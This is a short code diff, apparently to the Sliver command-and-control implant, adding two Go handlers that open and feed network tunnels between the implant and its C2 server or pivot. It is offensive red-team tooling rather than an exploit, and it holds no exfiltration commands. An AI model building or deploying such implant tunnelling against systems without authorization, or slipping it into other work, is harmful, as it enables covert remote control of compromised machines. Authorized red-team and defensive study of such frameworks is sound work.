@@ -26,7 +26,9 @@ import (
 	"log"
 	// {{end}}
 
+	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/comm"
 	"github.com/bishopfox/sliver/sliver/shell"
 	"github.com/bishopfox/sliver/sliver/transports"
 
@@ -43,6 +45,9 @@ var (
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
+
+		sliverpb.MsgCommTunnelOpenReq: commTunnelHandler,
+		sliverpb.MsgCommTunnelData:    commTunnelDataHandler,
 	}
 
 	// TunnelID -> Sequence Number -> Data
@@ -220,4 +225,43 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
 	// {{end}}
 
+}
+
+// commTunnelHandler - A special handler that receives a Tunnel ID (sent by the server or a pivot)
+// and gives this tunnel ID to the current active Transport. The latter passes it down to the Comm
+// system, which creates the tunnel and uses it as a net.Conn for speaking with the C2 server/pivot.
+func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	data := &sliverpb.CommTunnelOpenReq{}
+	proto.Unmarshal(envelope.Data, data)
+
+	// We pass it don to the Transport: blocks until the Transport takes it, on purpose.
+	transports.Transports.CommID <- data.TunnelID
+
+	muxResp, _ := proto.Marshal(&sliverpb.CommTunnelOpen{
+		Success:  true,
+		Response: &commonpb.Response{},
+	})
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.ID,
+		Data: muxResp,
+	}
+}
+
+// commTunnelDataHandler - Receives tunnel data over the implant's connection (in case the stack used is custom DNS/HTTPS),
+// and passes it down to the appropriate Comm tunnel. Will be written to its buffer, then consumed by the Comm's SSH layer.
+func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	data := &sliverpb.CommTunnelData{}
+	proto.Unmarshal(envelope.Data, data)
+	log.Printf("Received %d bytes from server", len(data.Data))
+	tunnel := comm.Tunnels.Tunnel(data.TunnelID)
+	if tunnel != nil {
+		tunnel.FromServer <- data
+		// {{if .Config.Debug}}
+		log.Printf("[tunnel] From server %d bytes", len(data.Data))
+		// {{end}}
+	} else {
+		// {{if .Config.Debug}}
+		log.Printf("Data for nil tunnel %d", data.TunnelID)
+		// {{end}}
+	}
 }
